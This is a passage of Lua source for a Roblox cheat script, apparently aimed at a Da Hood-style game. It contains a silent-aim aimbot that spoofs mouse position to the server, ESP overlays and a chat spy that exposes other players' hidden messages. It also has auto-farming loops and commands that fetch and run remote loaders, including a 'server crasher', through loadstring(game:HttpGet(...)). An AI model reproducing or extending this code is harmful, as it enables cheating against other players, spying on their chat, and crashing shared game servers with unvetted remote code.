    commands.loadcrash = function(player, args)
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/25ac460fa4de825b45aba4aedf9a7eee.lua"))()
    end

    commands.autocmd = function(player, args)
        local command = args[1]

        if tostring(command) then
            autoUseExploitPremCommand = true
            exploiterCommand = command
        else
            autoUseExploitPremCommand = false
        end
    end

    commands.fps = function(player, args)
        local fpsAmount = tonumber(args[1])
        if fpsAmount then
            setfpscap(fpsAmount)
        end 
    end

    local autoOpenToggle = false
    commands.opencrates = function(player, args)
        local code = args[1]

        local legendaryItemUnboxed = false
        local connection
        autoOpenToggle = not autoOpenToggle
        
        connection = MAIN_EVENT.OnClientEvent:Connect(function(eventName, gunName, skinName)
            if eventName == "CrateOpening" then
                print(gunName.." "..skinName.." unboxed")

                if string.match(skinName, "Death") or string.match(skinName, "Glory") or string.match(skinName, "Galaxy") or string.match(skinName, "Matrix") or string.match(skinName, "Inferno") then
                    legendaryItemUnboxed = true
                    messagebox(gunName.." "..skinName.." unboxed!", "Legendary item unboxed!", 0)
                    autoOpenToggle = false
                end
            end
        end)

        while PLAYER.DataFolder.Currency.Value > ORIGINAL_CASH_AMOUNT - 10000000 and legendaryItemUnboxed == false and autoOpenToggle == true and not code do
            MAIN_EVENT:FireServer("PurchaseSkinCrate", true)
            task.wait(0.5)
        end

        if code then
            MAIN_EVENT:FireServer("EnterPromoCode", code)
            task.wait(0.5) -- /e opencrates 2022JUNE
            if legendaryItemUnboxed == false then
                --loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                --messagebox("tried code, no legendary item unboxed :(", "Crash server", 0)
            end
        end

        if PLAYER.DataFolder.Currency.Value <= ORIGINAL_CASH_AMOUNT - 10000000 and legendaryItemUnboxed == false then
            autoOpenToggle = false
            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/25ac460fa4de825b45aba4aedf9a7eee.lua"))()
            messagebox("10 mil spent, no legendary item unboxed :(", "Crash server", 0)
        end

        connection:Disconnect()
    end

    local shootMeToggle = false
    commands.shootme = function(player, args)
        local playerToShootMe = findPlayer(args[1])

        shootMeToggle = not shootMeToggle

        if playerToShootMe and playerToShootMe.Character and mousePosPartsFolder:FindFirstChild(playerToShootMe.Name) then
            while shootMeToggle == true and isCharacterLoaded(PLAYER) and isCharacterLoaded(playerToShootMe) do
                PLAYER.Character.HumanoidRootPart.CFrame = CFrame.new(mousePosPartsFolder[playerToShootMe.Name].Position)
                task.wait()
            end
        end
    end

    commands.tp = function(player, args)
        local teleportLocation = ALT_SETUP_LOCATIONS_OG[string.lower(args[1])]

        if teleportLocation then
            PLAYER.Character.HumanoidRootPart.CFrame = CFrame.new(teleportLocation + Vector3.new(0, 5, 0))
        end
    end

    commands.destroychar = function(player, args)
        for _, v in ipairs(PLAYER.Character:GetChildren()) do
            if v:IsA("BasePart") then
                v:Destroy()
            end
        end
    end

    commands.ultralowgfx = function(player, args)
        if args[1] then
            if args[1] == "on" then
                RunService:Set3dRenderingEnabled(false)
                --RunService:setThrottleFramerateEnabled(true)
                LowGfxScreenGui.Enabled = true
                setfpscap(15)
            elseif args[1] == "off" then
                RunService:Set3dRenderingEnabled(true)
                --RunService:setThrottleFramerateEnabled(false)
                LowGfxScreenGui.Enabled = false
                setfpscap(160)
            end
        end
    end 

    commands.hidecash = function(player, args)
        if args[1] then
            if args[1] == "on" then
                hideCash = true
            elseif args[1] == "off" then
                hideCash = false
            end
        else
            hideCash = not hideCash
        end

        LPH_JIT_MAX(function()
            if hideCash == true then
                for _, v in pairs(IGNORED.Drop:GetChildren()) do
                    if v:IsA("Part") then
                        if v:FindFirstChild("Decal") then
                            v.Decal:Destroy()
                            v.Decal:Destroy()
                        end
                        v.BillboardGui.Enabled = false
                        v.Transparency = 1
                    end
                end
            else
                for _, v in pairs(IGNORED.Drop:GetChildren()) do
                    if v:IsA("Part") then
                        v.BillboardGui.Enabled = true
                        v.Transparency = 0
                    end
                end
            end
        end)();
    end

    commands.joinnotifs = function(player, args)
        if args[1] then
            if args[1] == "on" then
                joinNotifs = true
            elseif args[1] == "off" then
                joinNotifs = false
            end
        else
            joinNotifs = not joinNotifs
        end
    end

    commands.thugmode = function(player, args)
        thugMode = true

        for _, character in ipairs(PLAYERS_FOLDER:GetChildren()) do
            thugify(character)
        end
    end 

    --[ALT COMMANDS]
    --[[
    commands.drop = function(player, args) 
        for _, v in pairs(Players:GetPlayers()) do
            if isAlt(v.UserId) and v.Character and v.Character:GetAttribute("BDHCreated") then
                local miscInfo = v.Character.HumanoidRootPart.BDHGui.Frame.MiscInfo
                miscInfo.ETR.Visible = true
            end
        end
    end
    -]]


    local joinSound = Instance.new("Sound")
    joinSound.SoundId = "rbxassetid://247824088"
    joinSound.Parent = workspace
    local function setupPlayer(player)
        --Values
        local dataFolder = player:WaitForChild("DataFolder")
        local informationFolder = dataFolder:WaitForChild("Information")
        local wanted = informationFolder:WaitForChild("Wanted")

        player.Chatted:Connect(function(message)
            if player == PLAYER then
                if string.sub(message, 1, 3) == "/e " then -- is a main command
                    local splitString = message:split(" ")
                    local cmdName = splitString[2]
    
                    if commands[cmdName] then
                        local args = {}
    
                        for i = 3, #splitString, 1 do
                            table.insert(args, splitString[i])
                        end
    
                        commands[cmdName](player, args)
                    end
                end
            end
        end)

        if joinNotifs == true then
            local bindable = Instance.new("BindableFunction")
            function bindable.OnInvoke(response)
                if response == "Yes" then
                    while isCharacterLoaded(player) == false do task.wait() end -- rare memory leak here but oh well...
                    PLAYER.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0))
                end
            end
            local icon, isReady = Players:GetUserThumbnailAsync(player.UserId,  Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
            StarterGui:SetCore("SendNotification", {
                Title = "Player Joined",
                Text = "'"..player.Name.."' joined the game! Teleport to this player?",
                Duration = 15,
                Icon = icon,
                Callback = bindable,
                Button1 = "Yes",
                Button2 = "No"
            })
            joinSound:Play()
        end

        while not isCharacterLoaded(player) do task.wait() end -- wait until player has loaded
        local character = player.Character

        if player == PLAYER then
            --Anti-fling
            character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            player.CharacterAdded:Connect(function(character) -- if they die
                while not isCharacterLoaded(player) do task.wait() end -- wait until player has fully loaded
                character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            end)

            --Officer
            dataFolder.Officer.Changed:Connect(function(newValue)
                isOfficer = newValue == 1 and true or false
                for _, v in pairs(Players:GetPlayers()) do
                    if isCharacterLoaded(player) and player.Character:GetAttribute("BDHCreated") then
                        updateNameGui(v)
                    end
                end
            end)
            if dataFolder.Officer.Value == 1 then
                isOfficer = true
                task.spawn(function()
                    task.wait(5)
                    for _, v in pairs(Players:GetPlayers()) do
                        if isCharacterLoaded(player) and player.Character:GetAttribute("BDHCreated") then
                            updateNameGui(v)
                        end
                    end
                end)
            end
        end
        
        characterAppearanceLoaded(character, player)
        player.CharacterAdded:Connect(function(character) -- if they die
            while not isCharacterLoaded(player) do task.wait() end -- wait until player has fully loaded
            characterAppearanceLoaded(character, player)
        end)

        --Uncertain value(s) (could be potentially added at any time, or could exist already)
        if informationFolder:FindFirstChild("Crew") then --if already exists
            task.spawn(function()
                task.wait(3) -- wait for crew value to be assigned by server
                updateCrewCount(player.Name, informationFolder.Crew.Value, 1)
            end)
        end
        informationFolder.ChildAdded:Connect(function(child) --if added later
            if child.Name == "Crew" then
                task.wait(3) -- wait for crew value to be assigned by server
                updateCrewCount(player.Name, informationFolder.Crew.Value, 1)
            end
        end)

        --Cash
        local oldCurrencyValue = dataFolder.Currency.Value
        dataFolder.Currency.Changed:Connect(function(newValue)
            if player.Character and player.Character:GetAttribute("BDHCreated") == true then
                --Currency value above head
                local frame = player.Character.HumanoidRootPart.BDHGui.Frame
                local Cash = frame.Cash
                Cash.Text = "$"..commaValue(newValue)
                if isAlt(player.UserId) then
                    frame.MiscInfo.ETR.Text = "ETR: "..convertToHMS(calculateSecondsToDrop(newValue))
                end

                if isCharacterLoaded(player) and PLAYER:DistanceFromCharacter(player.Character.HumanoidRootPart.Position) < 150 then
                    --Total cash effect
                    Cash.TextColor3 = Color3.fromRGB(255, 255, 255)
                    TweenService:Create(Cash, TweenInfo.new(1, Enum.EasingStyle.Linear), {["TextColor3"] = Color3.fromRGB(0, 255, 0)}):Play()

                    --Currency gained GUI
                    local currencyDifference = newValue - oldCurrencyValue
                    local stringCurrencyDifference = currencyDifference > 0 and "+$"..commaValue(currencyDifference) or "-$"..commaValue(math.abs(currencyDifference))
                    local colorValue = currencyDifference > 0 and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
                    oldCurrencyValue = newValue

                    
                    local part = Instance.new("Part")
                    part.Name = "MoneyGainedLostEffect"
                    part.Size = Vector3.new(1, 1, 1)
                    part.Position = character.Head.Position + Vector3.new(0, 0.75, 0)
                    part.Transparency = 1
                    part.Anchored = true
                    part.CanCollide = false
                    part.Parent = workspace

                    --MoneyGainedLost (of 'BillboardGui' class)
                    local MoneyGainedLost = Instance.new("BillboardGui")
                    MoneyGainedLost.Name = "MoneyGainedLost"
                    MoneyGainedLost.LightInfluence = 0
                    MoneyGainedLost.Size = UDim2.new(2, 50, 0.5, 12)
                    MoneyGainedLost.Parent = part

                    --Create instances
                    local MoneyGainedLostLbl = Instance.new("TextLabel")

                    --Set attributes
                    LPH_JIT_MAX(function()
                        MoneyGainedLostLbl.Name = "MoneyGainedLostLbl"
                        MoneyGainedLostLbl.TextStrokeTransparency = 0.8
                        MoneyGainedLostLbl.Size = UDim2.new(1, 0, 1, 0)
                        MoneyGainedLostLbl.TextColor3 = colorValue
                        MoneyGainedLostLbl.Text = stringCurrencyDifference
                        MoneyGainedLostLbl.Font = Enum.Font.SourceSans
                        MoneyGainedLostLbl.BackgroundTransparency = 1
                        MoneyGainedLostLbl.TextScaled = true
                        MoneyGainedLostLbl.Parent = MoneyGainedLost
                    end)();

                    TweenService:Create(part, TweenInfo.new(1, Enum.EasingStyle.Linear), {Position = part.Position + Vector3.new(0, 4, 0)}):Play()
                    TweenService:Create(MoneyGainedLostLbl, TweenInfo.new(1, Enum.EasingStyle.Quart), {TextTransparency = 1}):Play()
                    TweenService:Create(MoneyGainedLostLbl, TweenInfo.new(1, Enum.EasingStyle.Quart), {TextStrokeTransparency = 1}):Play()
                    task.wait(1)
                    part:Destroy()
                end
            end
        end)

        --Bounty
        wanted.Changed:Connect(function(newValue)
            if player.Character and player.Character:GetAttribute("BDHCreated") == true then
                local bounty = tonumber(newValue)
                local miscInfo = player.Character.HumanoidRootPart.BDHGui.Frame.MiscInfo

                miscInfo.Bounty.Text = "Bounty: $"..commaValue(bounty)

                if isOfficer == true then
                    if bounty > 0 then
                        miscInfo.Visible = true
                        miscInfo.Bounty.Visible = true
                    else
                        miscInfo.Bounty.Visible = false
                        miscInfo.Visible = false
                        for _, v in ipairs(miscInfo:GetChildren()) do
                            if v:IsA("TextLabel") and v.Visible == true then
                                miscInfo.Visible = true
                                break
                            end
                        end
                    end
                end
            end
        end)
    end

    --Chat spy
    --This script reveals ALL hidden messages in the default chat
    local enabled = true --chat "/e spy" to toggle!
    local spyOnMyself = true --if true will check your messages too
    local public = false --if true will chat the logs publicly (fun, risky)
    local publicItalics = false --if true will use /me to stand out
    local privateProperties = { --customize private logs
        Color = Color3.fromRGB(0,255,255); 
        Font = Enum.Font.SourceSansBold;
        TextSize = 18;
    }

    local saymsg = DefaultChatSystemChatEvents:WaitForChild("SayMessageRequest")
    local getmsg = DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering")
    local instance = (_G.chatSpyInstance or 0) + 1
    _G.chatSpyInstance = instance

    local function onChatted(p,msg)
        if _G.chatSpyInstance == instance then
            if p==PLAYER and msg:lower():sub(1,6)=="/e spy" then
                enabled = not enabled
                task.wait(0.3)
                privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
                StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
            elseif enabled and (spyOnMyself==true or p~=PLAYER) then
                msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
                local hidden = true
                local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
                    if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and p.Team==PLAYER.Team)) then
                        hidden = false
                    end
                end)
                task.wait(1)
                conn:Disconnect()
                if hidden and enabled then
                    if public then
                        saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
                    else
                        privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
                        StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                    end
                end
            end
        end
    end

    for _,p in ipairs(Players:GetPlayers()) do
        p.Chatted:Connect(function(msg) onChatted(p,msg) end)
    end
    Players.PlayerAdded:Connect(function(p)
        p.Chatted:Connect(function(msg) onChatted(p,msg) end)
    end)
    privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
    PLAYER_GUI:WaitForChild("Chat")
    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
    task.wait(3)
    local chatFrame = PLAYER_GUI.Chat.Frame
    chatFrame.ChatChannelParentFrame.Visible = true
    chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

    --Low gfx
    --Build LOW_GFX_PARTS table
    local function addToLowGfxTable(parent)
        LPH_JIT_MAX(function()
            local count = 0
            for _, v in ipairs(parent:GetDescendants()) do
                if v:IsA("BasePart") then
                    LOW_GFX_PARTS[v] = v.Material
                end
                if count < 1200 then
                    count += 1
                else
                    count = 0
                    task.wait()
                end
            end
        end)();
    end
    addToLowGfxTable(CASHIERS)
    addToLowGfxTable(IGNORED)
    addToLowGfxTable(LIGHTS)
    addToLowGfxTable(MAP)

    --Toggle low gfx
    toggleLowGfx(lowGfx)

    --Anti-afk
    PLAYER.Idled:Connect(function()
        VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)

    --Remove seats
    LPH_JIT_MAX(function()
        local count = 0
        for _, v in ipairs(MAP:GetDescendants()) do
            if v:IsA("Seat") or v:IsA("VehicleSeat") then
                v.Disabled = true
            end
            if count < 500 then
                count += 1
            else
                count = 0
                task.wait()
            end
        end
    end)();

    --Max zoom
    PLAYER.CameraMaxZoomDistance = math.huge

    --Hide cash
    IGNORED.Drop.ChildAdded:Connect(function(v)
        if hideCash == true and v:IsA("Part") and v.Parent ~= nil then
            v:WaitForChild("Decal"):Destroy()
            v:WaitForChild("Decal"):Destroy()
            v.Transparency = 1
            v:WaitForChild("BillboardGui").Enabled = false
        else
            v:WaitForChild("Decal"):Destroy()
            v:WaitForChild("Decal"):Destroy()
        end
    end)

    --Shift lock
    local shiftLockToggle = false
    local function shiftLock()
        if shiftLockToggle == true then
            --UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
            local character = PLAYER.Character
            if character then
                local head = character:FindFirstChild("Head")
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local humanoid = character:FindFirstChild("Humanoid")
                local camera = workspace.CurrentCamera

                if humanoidRootPart and humanoid.Sit == false then
                    local lookVector = camera.CFrame.LookVector
                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position) * CFrame.Angles(0, math.atan2(-lookVector.X, -lookVector.Z), 0)
                end
                if head then
                    local inFirstPerson = (camera.Focus.p - camera.CoordinateFrame.p).magnitude
                    inFirstPerson = (inFirstPerson<2) and (1.0-(inFirstPerson-0.5)/1.5) or 0
                    if inFirstPerson < 0.5 then
                        camera.CFrame = camera.CFrame * CFrame.new(1.75, 0, 0)
                    end
                end
            end
        end
    end
    RunService:BindToRenderStep("ShiftLock", 201, shiftLock)

    --Testing position finding
    task.spawn(function()
        while true do
            for _, player in ipairs(Players:GetPlayers()) do
                if markedPlayers[player.UserId] and isCharacterLoaded(player) then
                    print(player.Name.." location = "..getCharacterLocation(player.Character.HumanoidRootPart))
                end
                task.wait()
            end
            task.wait(3)
        end
    end)

    --Setup gun shops
    for gunNameBrackets, gunInfo in pairs(WEAPONS) do
        for _, shop in ipairs(SHOPS) do
            local gunName = string.gsub(string.split(string.split(gunNameBrackets, "]")[1], "[")[2], "-", "%%-")
            
            if shop.Name:match("%["..gunName.." Ammo%]") and shop.Name:match(gunName) then
                table.insert(gunInfo.ShopClickDetectors, shop.ClickDetector)
            end
        end
    end

    --Auto purchase gun ammo
    LPH_JIT_MAX(function()
        task.spawn(function()
            while true do
                if equippedWeapons[PLAYER] then
                    for gunName, owned in pairs(equippedWeapons[PLAYER]) do
                        if WEAPONS[gunName].ShopClickDetectors and owned == true then
                            for _ , clickDetector in pairs(WEAPONS[gunName].ShopClickDetectors) do
                                if isCharacterLoaded(PLAYER) and tonumber(INVENTORY[gunName].Value) < WEAPONS[gunName].MaxAutoAmmo and (clickDetector.Parent.Head.Position - PLAYER.Character.HumanoidRootPart.Position).magnitude < clickDetector.MaxActivationDistance then
                                    fireclickdetector(clickDetector)
                                end
                                task.wait()
                            end
                        end
                    end
                end
                task.wait()
            end
        end)
    end)();

    --Chat bubbles appear above BDH overhead gui
    ChatService.BubbleChatEnabled = true
    
    local settings = {
        --MinDistance = 80,
        LocalPlayerStudsOffset = Vector3.new(0, -1.5, 0),
        VerticalStudsOffset = 1.5,
    }
    
    ChatService:SetBubbleChatSettings(settings)

    local function getClosestPartFromArray(array)
        local closest = {}
        local mousePos = Vector2.new(MOUSE.X, MOUSE.Y)

        for _, part in ipairs(array) do
            if part:IsA("BasePart") then
                local vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(part.Position)
                if onScreen then
                    local distance = (mousePos - Vector2.new(vector.X, vector.Y)).Magnitude
                    if closest["Distance"] == nil then closest = {["Part"] = part, ["Distance"] = distance} continue end
                    if  distance < closest["Distance"] then
                        closest = {["Part"] = part, ["Distance"] = distance}
                    end
                end
            end
        end
        if closest.Distance == nil then -- if nothing exists then
            return nil
        else
            return closest
        end
    end

    local function silentAimWhitelistCheck(character, bodyEffects)
        local player = Players:GetPlayerFromCharacter(character)
        local ko = bodyEffects["K.O"]
        if getgenv().silentAimSettings.KOed_Check == true and ko.Value == true then return false end -- KO check
        if getgenv().silentAimSettings.FriendCheck == true and isFriend(player) == true then return false end -- KO check
        if getgenv().silentAimSettings.CrewCheck == true and isInCrew(player) == true then return false end -- KO check
        return true
    end

    LPH_JIT_MAX(function()
        RunService.Heartbeat:Connect(function()
            if mainModule.GunHold(PLAYER.Character) ~= false and getgenv().sendingMessage == false then
                if silentAim == true then
                    --Get closest character
                    local humanoidRootParts = {}
                    for _, character in ipairs(PLAYERS_FOLDER:GetChildren()) do
                        if character:FindFirstChild("HumanoidRootPart") and PLAYER.Character ~= character then
                            humanoidRootParts[#humanoidRootParts + 1] = character.HumanoidRootPart
                        end
                    end
                    local closestHumanoidRootPartInfo = getClosestPartFromArray(humanoidRootParts)
        
                    --Get closest part in character
                    if closestHumanoidRootPartInfo and closestHumanoidRootPartInfo.Distance < getgenv().silentAimSettings.Radius then
                        --Get closest part in character
                        local character = closestHumanoidRootPartInfo.Part.Parent
                        local closestPartInCharInfo = getClosestPartFromArray(character:GetChildren())
                        --Other info
                        local fullyLoadedChar = character:FindFirstChild("FULLY_LOADED_CHAR")
                        local predictedPosition = closestPartInCharInfo.Part.Position + closestHumanoidRootPartInfo.Part.Velocity * 0.102421
        
                        if fullyLoadedChar then-- Check if character is loaded
                            local randomValue = math.random(1, 100)
                            --More info if the character is loaded
                            local humanoid = character:FindFirstChild("Humanoid")
                            local bodyEffects = character.BodyEffects
        
                            if silentAimWhitelistCheck(character, bodyEffects) == false then -- Whitelist checks
                                predictedPosition = MOUSE.Hit.p
                            else
                                if humanoid and humanoid.FloorMaterial == Enum.Material.Air then -- Jumping
                                    if randomValue > getgenv().silentAimSettings.JumpingHitChance then -- % chance to not hit airshot
                                        predictedPosition = MOUSE.Hit.p
                                    end
                                else -- Not jumping
                                    if randomValue > getgenv().silentAimSettings.WalkingHitChance then -- % chance to not hit groundshot
                                        predictedPosition = MOUSE.Hit.p
                                    end
                                end
                            end
                        end
        
                        MAIN_EVENT:FireServer("UpdateMousePos", predictedPosition)
                    else
                        MAIN_EVENT:FireServer("UpdateMousePos", MOUSE.Hit.p)
                    end
                elseif silentAim == false then
                    MAIN_EVENT:FireServer("UpdateMousePos", MOUSE.Hit.p)
                end
            end
        end)
    end)();

    --Hotkeys
    local changingEspType = false
    local ctrlDown = false
    local espModeDebounce = false
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.Keyboard and espModeDebounce == false and gameProcessed == false then
            if input.KeyCode == Enum.KeyCode.C then -- greet
                MAIN_EVENT:FireServer("AnimationPack", "Greet")
            elseif input.KeyCode == Enum.KeyCode.X then -- lay
                MAIN_EVENT:FireServer("AnimationPack", "Lay")
            elseif input.KeyCode == Enum.KeyCode.E then -- lay
                if stomping == false then
                    task.spawn(function()
                        stomping = true
                        task.wait(1.5)
                        stomping = false
                    end)
                end
            elseif input.KeyCode == Enum.KeyCode.LeftControl then
                ctrlDown = true
            elseif input.KeyCode == Enum.KeyCode.Q then
                --Pickup snow
                if ctrlDown == true then
                    MAIN_EVENT:FireServer("PickSnow")
                end

                --Fake macro
                while UserInputService:IsKeyDown(Enum.KeyCode.Q) do
                    local waitTime = math.random(10, 20) / 1000
                    keypress(0x49)
                    keyrelease(0x49)
                    task.wait(waitTime)
                    keypress(0x4F)
                    keyrelease(0x4F)
                    task.wait(waitTime)
                end
                PLAYER.CameraMinZoomDistance = 0
                PLAYER.CameraMaxZoomDistance = math.huge
            elseif input.KeyCode == Enum.KeyCode.V and espModeDebounce == false then --toggle esp - default, everyone, and off
                espModeDebounce = true
                if espMode == "Default" then
                    espMode = "Everyone"
                    for _, character in ipairs(workspace.Players:GetChildren()) do
                        if character:GetAttribute("BDHCreated") == true then
                            character.HumanoidRootPart.BDHGui.AlwaysOnTop = true
                            character.HumanoidRootPart.BDHGui.MaxDistance = math.huge
                        end
                    end
                elseif espMode == "Everyone" then
                    espMode = "Off"
                    for _, character in ipairs(workspace.Players:GetChildren()) do
                        if character:GetAttribute("BDHCreated") == true then
                            character.HumanoidRootPart.BDHGui.Enabled = false
                            character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
                        end
                    end
                elseif espMode == "Off" then
                    espMode = "Default"
                    for _, character in ipairs(workspace.Players:GetChildren()) do
                        if character:GetAttribute("BDHCreated") == true then
                            if PLAYER.Character ~= character then
                                character.HumanoidRootPart.BDHGui.Enabled = true
                            end
                            character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
                            updateNameGui(Players:GetPlayerFromCharacter(character))
                        end
                    end
                end
                espModeDebounce = false
            elseif input.KeyCode == Enum.KeyCode.Z then --shiftlock (update this to wall glitch for you)
                shiftLockToggle = not shiftLockToggle
            elseif input.KeyCode == Enum.KeyCode.P then --toggle silent aim
                silentAim = not silentAim
                if silentAim == true then
                    StarterGui:SetCore("SendNotification", {
                        Title = "Silent Aim",
                        Text = "Silent aim turned On",
                        Duration = 5,
                    })
                elseif silentAim == false then
                    StarterGui:SetCore("SendNotification", {
                        Title = "Silent Aim",
                        Text = "Silent aim turned Off",
                        Duration = 5,
                    })
                end
            end
        end
    end)

    UserInputService.InputEnded:Connect(function(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.Keyboard and gameProcessed == false then
            if input.KeyCode == Enum.KeyCode.LeftControl then -- greet
                ctrlDown = false
            end
        end
    end)

    --Tabbed in/out
    UserInputService.WindowFocused:Connect(function() -- in
        updateMousePosWithDebounce(Vector3.new(0, 10000, 50000))
    end)
    UserInputService.WindowFocusReleased:Connect(function() -- out
        updateMousePosWithDebounce(Vector3.new(1, 10000, 50000))
    end)

    --Incase players joined before script ran
    for _, player in ipairs(Players:GetPlayers()) do
        task.spawn(function()
            setupPlayer(player)
        end)
    end

    --Connections
    Players.PlayerAdded:Connect(setupPlayer)

    local leftSound = Instance.new("Sound")
    leftSound.SoundId = "rbxassetid://247824149"
    leftSound.Parent = workspace
    Players.PlayerRemoving:Connect(function(player)
        --Join notif
        if joinNotifs == true then
            local icon, isReady = Players:GetUserThumbnailAsync(player.UserId,  Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
            StarterGui:SetCore("SendNotification", {
                Title = "Player Left",
                Text = "'"..player.Name.."' left the game",
                Duration = 15,
                Icon = icon,
            })

            leftSound:Play()
        end

        --Mouse beam part cleanup
        local mousePosPart = workspace.MousePosPartsFolder:FindFirstChild(player.Name)
        if mousePosPart then mousePosPart:Destroy() end

        --Crew
        for crewId, crew in pairs(crews) do
            if crew.Loaded == true and crew.Members[player.Name] == true then
                updateCrewCount(player.Name, crewId, -1)
                break
            end
        end
        altsCache[player.UserId] = nil
    end)
end





--[[
-- Define localplayer
local player = game:GetService('Players').LocalPlayer

-- Toggle just in case
getgenv().LettuceFarm = true

local function lettuceFarm()
    repeat task.wait()
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            -- Define lettuce
            local Lettuce = player.Backpack:FindFirstChild('[Lettuce]') or player.Character:FindFirstChild('[Lettuce]')
            if Lettuce then -- Do we have lettuce?
                Lettuce.Parent = player.Character
                Lettuce:Activate()
            elseif not Lettuce then -- No lettuce, we must buy some
                player.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.Ignored.Shop['[Lettuce] - $5'].Head.Position + Vector3.new(0, 3, 0))
                fireclickdetector(workspace.Ignored.Shop['[Lettuce] - $5'].ClickDetector)
            end
        end
    until tonumber(player.DataFolder.Information.MuscleInformation.Value) <= -15000 or not getgenv().LettuceFarm
end

lettuceFarm()
--]]
